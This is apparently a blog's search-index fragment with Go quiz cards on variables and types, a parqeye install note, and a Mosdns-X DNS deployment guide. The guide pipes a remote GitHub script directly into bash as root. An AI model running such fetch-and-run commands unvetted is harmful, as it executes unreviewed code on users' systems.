style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/Th1vvvhoDjR\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003ecompliation error\n-128 / a (constant 128 of type int8) overflows int8\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable4\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint8\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint8\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/Z8N_FB4szWY\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e-128\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable5\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt1\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt2\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e =\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei1\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt1\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei2\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt2\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ei1\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ei2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/Q25PLVaAOfd\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003ecompilation error\ncannot use i (variable of type int) as MyInt1 value in variable declaration\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable6\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eX\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e7.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{} = \u003cspan style=\"color:#a6e22e\"\u003eX\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e.(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t} \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(int(\u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 7\u003c/li\u003e\n\u003cli\u003eB. 7.0\u003c/li\u003e\n\u003cli\u003eC. 0\u003c/li\u003e\n\u003cli\u003eD. compilation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/lKmlfL6X6Qu\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Variable"},{"categories":["URL","Rust","Parquet"],"contents":" parqeye install methods cargo install parqeye brew install kaushiksrini/parqeye/parqeye ","date":"November 18, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20251118-parqeye/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/kaushiksrini/parqeye\" target=\"_blank\" rel=\"noopener\"\u003eparqeye\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"install-methods\"\u003einstall methods\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ecargo install parqeye\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ebrew install kaushiksrini/parqeye/parqeye\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Rust","Parquet"],"title":"parqeye"},{"categories":["URL","Go","DNS","linux"],"contents":" Mosdns-X 让 Linux 系统的 DNS 更快更干净：部署 Mosdns-X install bash \u0026lt;(curl -sL https://raw.githubusercontent.com/lidebyte/bashshell/refs/heads/main/mosdns-x-manager.sh) config sudo tee /etc/mosdns-x/config.yaml \u0026gt; /dev/null \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; # mosdns-x 并发查询（无分流）配置 log: level: info file: /var/log/mosdns-x/mosdns-x.log plugins: # 缓存插件 - tag: cache type: cache args: size: 1024 lazy_cache_ttl: 1800 # 并发上游：取最先返回的可用答案 - tag: forward_all type: fast_forward args: upstream: # 阿里 - addr: \u0026#34;udp://223.5.5.5\u0026#34; - addr: \u0026#34;tls://dns.alidns.com\u0026#34; # DNSPod / doh.pub - addr: \u0026#34;udp://119.29.29.29\u0026#34; - addr: \u0026#34;tls://dot.pub\u0026#34; # Cloudflare - addr: \u0026#34;udp://1.1.1.1\u0026#34; - addr: \u0026#34;tls://cloudflare-dns.com\u0026#34; # Google - addr: \u0026#34;udp://8.8.8.8\u0026#34; - addr: \u0026#34;tls://dns.google\u0026#34; # 主流水线：小缓存 → 并发优选 - tag: main type: sequence args: exec: - cache - forward_all # 监听（双栈 UDP/TCP 53） servers: - exec: main listeners: - addr: :53 protocol: udp - addr: :53 protocol: tcp EOF systemd sudo tee /etc/systemd/system/mosdns.service \u0026gt; /dev/null \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; [Unit] Description=Mosdns-X DNS Accelerator After=network.target [Service] Type=simple User=root Group=root ExecStart=/usr/local/bin/mosdns-x start --as-service -d /usr/local/bin -c /etc/mosdns-x/config.yaml Restart=always RestartSec=5 StandardOutput=journal StandardError=journal SyslogIdentifier=mosdns [Install] WantedBy=multi-user.target EOF sudo systemctl daemon-reload sudo systemctl enable --now mosdns # 备份系统 DNS sudo cp -n /etc/resolv.conf /etc/resolv.conf.mosdns-backup # 改为使用本地 Mosdns-X echo -e \u0026#34;nameserver 127.0.0.1\\noptions edns0\u0026#34; | sudo tee /etc/resolv.conf # 若 53 端口被 systemd-resolved 占用，可禁用它 sudo systemctl disable --now systemd-resolved 2\u0026gt;/dev/null || true # 如果想顺便加锁（防止被 DHCP 修改），加上 chattr 一起执行： echo -e \u0026#34;nameserver 127.0.0.1\\n\u0026#34; \u0026gt; /etc/resolv.conf \u0026amp;\u0026amp; chattr +i /etc/resolv.conf # 查看进程状态 sudo systemctl status mosdns --no-pager # 测试解析速度（第二次命中缓存更快） dig +stats www.google.com dig +stats www.baidu.com # 查看实时日志 tail -f /var/log/mosdns-x/mosdns-x.log ","date":"November 9, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20251109-mosdns-x/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/pmkol/mosdns-x\" target=\"_blank\" rel=\"noopener\"\u003eMosdns-X\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://blog.ibytebox.com/archives/OxpX7FQ1\" target=\"_blank\" rel=\"noopener\"\u003e让 Linux 系统的 DNS 更快更干净：部署 Mosdns-X\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"install\"\u003einstall\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebash \u0026lt;\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecurl -sL https://raw.githubusercontent.com/lidebyte/bashshell/refs/heads/main/mosdns-x-manager.sh\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"config\"\u003econfig\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo tee /etc/mosdns-x/config.yaml \u0026gt; /dev/null \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;\u0026#39;EOF\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# mosdns-x 并发查询（无分流）配置\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003elog:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  level: info\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  file: /var/log/mosdns-x/mosdns-x.log\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eplugins:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  # 缓存插件\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - tag: cache\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    type: cache\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    args:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      size: 1024\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      lazy_cache_ttl: 1800\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  # 并发上游：取最先返回的可用答案\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - tag: forward_all\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    type: fast_forward\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    args:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      upstream:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        # 阿里\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;udp://223.5.5.5\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;tls://dns.alidns.com\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        # DNSPod / doh.pub\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;udp://119.29.29.29\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;tls://dot.pub\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        # Cloudflare\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;udp://1.1.1.1\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;tls://cloudflare-dns.com\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        # Google\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;udp://8.8.8.8\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;tls://dns.google\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  # 主流水线：小缓存 → 并发优选\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - tag: main\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    type: sequence\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    args:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      exec:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - cache\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - forward_all\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# 监听（双栈 UDP/TCP 53）\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eservers:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - exec: main\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    listeners:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      - addr: :53\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        protocol: udp\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      - addr: :53\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        protocol: tcp\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"systemd\"\u003esystemd\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo tee /etc/systemd/system/mosdns.service \u0026gt; /dev/null \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;\u0026#39;EOF\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eDescription=Mosdns-X DNS Accelerator\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan 